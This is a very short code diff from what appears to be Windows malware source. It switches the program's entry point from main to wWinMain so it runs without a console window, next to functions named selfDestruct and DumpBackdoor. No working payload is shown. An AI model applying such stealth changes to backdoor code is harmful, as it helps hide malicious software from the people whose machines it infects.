@@ -64,7 +64,7 @@ void selfDestruct()
 
 }
 
-int main()
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
     init();
     DumpBackdoor();
